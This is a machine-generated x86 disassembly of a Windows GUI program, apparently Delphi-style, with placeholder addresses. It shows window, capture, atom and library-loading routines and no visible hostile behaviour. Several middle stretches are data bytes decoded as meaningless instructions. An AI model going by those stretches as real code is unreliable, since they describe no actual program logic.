je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_4583f4
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406bf4
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_45841c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458390
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_458444
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_4583a8
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_4583c4
pop ebx
retn
mov eax ebx
call sub_4583f4
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_4584a8
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45860e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_45872c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_458710
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_458710
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_45881c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403190
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403190
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403190
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403190
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f20
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f20
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4588a4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_458a1c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408d6c
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403f74
mov eax [ rw-data ]
call sub_4043e0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d6c
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f74
mov eax [ rw-data ]
call sub_4043e0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4043e0
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4186dc
mov [ rw-data ] eax
call sub_4584a8
mov dl 0x1
mov eax [ r-xdata ]
call sub_4582d0
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46ab00
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46bbe4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_46d7cc
mov ecx r-xdata
mov edx sub_44a248
mov eax [ r-xdata ]
call sub_417c30
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458a23
lea eax [ ebp - 0x10 ]
call sub_403f20
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_458a8c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_458aeb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458af2
retn
mov eax rw-data
call sub_40d1d0
call sub_45881c
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_40499c
mov eax rw-data
call sub_403f20
mov eax rw-data
call sub_403f20
sub_458af4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_458b7a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458b81
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_4588a4
mov eax [ r-xdata ]
call sub_417aa4
mov eax [ r-xdata ]
call sub_417b44
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417af0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417af0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417af0
sub_458ced
mov [ ebp ] es
add edx [ eax ]
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x74617453
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ch
mov [ ebp ] es
or [ ecx + 0x73 ] ah
dec esi
outsd
jb r-xdata
add [ ecx + esi + 0x40 ] al
add [ edx * 4 - 0x7497ffbb ] ah
popad
insb
or esp [ ecx + 0x73 ]
push ebx
jne r-xdata
or al [ edx ]
test [ edx + 0xba40041 ] cl
inc edx
add [ eax - 0x6a ] cl
jo r-xdata
inc ecx
add ah cl
xor [ eax ] eax
and al 0x95
inc ebp
add [ eax - 0x75 ] ch
outsb
adc ah [ fs : ecx + 0x73 ]
push ebx
jne r-xdata
inc ebp
add [ ebx + ecx + 0xcac0042 ] dh
inc edx
add ah bl
push cs
xchg esi eax
jo r-xdata
outsb
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
or [ ecx + 0x63 ] al
je r-xdata
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax - 0x33ffba6c ] bh
xchg esi eax
inc ebp
add [ eax ] cl
xchg esi eax
inc ebp
add [ eax + eax ] al
std
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_458ec2
lea eax [ ebp ]
or [ eax ] al
or [ ecx + 0x63 ] al
je r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0900
dec esp
imul esi [ ebx + 0x74 ] 0xa28c0006
inc ebp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
arpl [ ebp + 0x74 ] si
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
mov [ ebp ] es
pop eax
add [ eax ] al
inc [ eax ]
cwde
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
je r-xdata
cmpsd [ esi ] [ edi ]
inc ecx
add ah dl
cmpsd [ esi ] [ edi ]
inc ecx
add ah al
mov al [ 0xffffffffa8100041 ]
inc ecx
add [ eax + ebp * 4 - 0x5fefffbf ] al
inc ebp
add [ edx - 0x6a9fffbf ] dh
inc ecx
add [ eax - 0x5d ] dl
inc ecx
add [ eax - 0x3ffbe5d ] dl
mov [ 0xffffffff99b00041 ] eax
inc ecx
add [ ebp - 0x6447ffbf ] cl
inc ecx
add [ esp + ebx * 4 - 0x5a37ffbf ] cl
inc ecx
add al bl
movsd [ edi ] [ esi ]
inc ecx
add al dh
pushfd
inc ecx
add [ ebp + ebx * 4 + 0x41 ] al
add al dh
popfd
inc ecx
add [ eax - 0x1fffbe61 ] cl
lahf
inc ecx
add [ eax + 0x41 ] dh
add [ eax ] bl
mov [ 0xffffffffa3340041 ] eax
inc ecx
add [ esi ] ch
inc ecx
add [ esp + 0x41 ] bh
add [ eax + ebp * 4 ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] cl
add [ 0x6f685354 ] cl
jb r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
dec esp
mov [ 0xffffffff8b680041 ] al
inc ecx
add [ eax ] ah
xchg edi eax
inc ecx
add [ eax ] bl
xchg esi eax
inc ecx
add ah dh
movsb [ edi ] [ esi ]
inc ecx
add [ eax ] ch
movsd [ edi ] [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 4 + 0x300045 ] cl
add [ eax ] al
mov al [ 0xffffffffd8004162 ]
xor eax [ eax ]
in al 0x33
inc eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4590 ] ah
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
add [ eax - 0x80000000 ] al
push es
add [ 0x74536e4f ] cl
popad
inc ebp
js r-xdata
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
test al 0x8c
inc ebp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
add [ ecx + esi + 0x40 ] al
inc ebx
jne r-xdata
add al ch
xor eax [ eax ]
in al dx
je r-xdata
xor eax [ eax ]
loopne r-xdata
inc ebx
push 0x65676e61
test al 0x8c
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
add ah ch
inc eax
dec esp
imul esi [ ebx + 0x74 ] 0x90a0c08b
inc ebp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
inc ecx
add [ 0xffffffffa5300041 ] ch
popad
je r-xdata
add [ eax ] al
add al [ eax ]
out dx al
inc ebp
add [ eax ] cl
lahf
inc ebp
add ah bl
push cs
movsb [ edi ] [ esi ]
or eax [ edx ]
add [ ecx ] dl
inc edx
add [ ebx + edx * 4 ] cl
inc ebx
jne r-xdata
inc ecx
add [ edx + ebx * 4 ] al
inc ecx
add [ esi - 0x58ffffbf ] ah
inc ecx
add [ eax ] dh
movsd [ edi ] [ esi ]
lea eax [ eax ]
hlt
add [ eax ] al
adc [ edx ] eax
or al 0x93
dec esp
imul esi [ ebx + 0x74 ] r-xdata
nop
arpl [ ecx ] ax
add [ eax ] al
or [ ecx + 0x63 ] al
je r-xdata
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
fmul [ esi ]
dec esp
imul esi [ ebx + 0x74 ] 0x91100000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 4 + 0x45 ] ah
add [ eax + 0x4591 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6bffba6f ] al
xchg ecx eax
inc ebp
add [ eax - 0x7c000000 ] ah
mov eax [ ebp ]
les ecx [ esi ]
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
loopne r-xdata
inc edx
add [ eax - 0x3fffba67 ] bl
adc [ edx ] eax
adc [ fs : edx ] eax
clc
adc [ edx ] al
sub [ ecx ] dl
inc edx
add ah bh
adc [ edx ] al
pushad
xchg esp eax
inc ebp
add [ eax ] dh
popfd
inc ebp
add al cl
pushfd
inc ebp
add [ eax ] al
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
or eax [ edx ]
in al 0xe
cdq
inc ebp
add [ edx + ebx * 4 ] bh
inc ebp
add ah cl
or al [ edx ]
test [ edx + 0xba40041 ] cl
inc edx
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
in al dx
sub_45918a
out dx eax
call [ edi + ebx * 4 + 0x45 ]
add [ edi + ebx * 4 + 0x45 ] bh
add [ 0x73754354 ] cl
je r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov al 0xf
inc edx
add [ edi + ecx + 0xfe40042 ] ch
inc edx
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
test al 0x91
inc ebp
add [ edi ] al
or eax 0x73754354
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4210a0
test bl bl
jle r-xdata
mov edx esi
call sub_4596b0
add [ eax + edx + 0x42 ] al
add [ eax ] bl
adc [ edx ] al
dec eax
adc [ edx ] al
push 0xfc00420f
cmovb eax [ eax ]
push eax
adc [ edx ] al
mov al [ 0xffffffffb4004598 ]
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
adc [ ecx - 0x73a7ffbb ] dl
inc ebp
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x92180000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004592 ] dl
add [ eax ] al
add [ esp + ebp * 2 + 0x33d80041 ] dl
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec45d238
xor eax [ eax ]
loopne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
cwde
inc ebp
add al cl
cwde
inc ebp
add ah bl
cwde
inc ebp
add al dh
cwde
inc ebp
add [ ecx + ebx * 4 ] al
inc ebp
add [ eax ] bl
cdq
inc ebp
add [ ecx + ebx * 4 ] ch
inc ebp
add [ eax - 0x67 ] al
inc ebp
add [ ecx + ebx * 4 + 0x45 ] dl
add [ eax - 0x67 ] ch
inc ebp
add [ ecx + ebx * 4 + 0x45 ] ch
add [ eax - 0x67 ] dh
inc ebp
add [ ecx + ebx * 4 + 0x45 ] dh
add [ eax - 0x67 ] bh
inc ebp
add [ ecx + ebx * 4 + 0x45 ] bh
add [ eax - 0x7bffba67 ] al
cdq
inc ebp
add [ eax - 0x73ffba67 ] cl
cdq
inc ebp
add [ eax - 0x6bffba67 ] dl
cdq
inc ebp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xb9e85653
mov [ 0xffffffffda8bfffa ] al
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
sub_45929c
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4210a0
test bl bl
jle r-xdata
mov edx esi
call sub_4596b0
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_45930c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420bb4
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_4593b4
sub_459340
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4592d0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418360
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_4184ec
sub_459388
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_40432c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403f74
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4593b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4596b0
mov edx ebx
mov eax esi
call sub_459690
sub_4593dc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4593b4
sub_459408
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46e548
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_40338c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_42112c
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_44a074
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_459460
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_46e570
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_40338c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421148
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_44a074
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4594b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420754
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_45963c
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_459524
push ebx
push esi
push edi
call sub_40355c
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403190
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418558
call sub_403190
mov eax [ edi + 0x30 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4207a0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403544
sub_459574
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_4595bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4184cc
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403340
mov edx edi
call sub_459340
sub_459608
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_45b364
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_45b3a8
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_420824
sub_459648
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420a70
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_4596b0
sub_459690
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418314
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_420824
pop esi
pop ebx
retn
sub_4596b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41860c
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_4596cc
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_459734
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_464420
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_45cc00
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_459fdc
mov edx ebp
call sub_45a03c
inc eax
je r-xdata
sub_4597c0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4597e0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_459800
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_459c50
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_459c50
sub_459998
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42105c
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
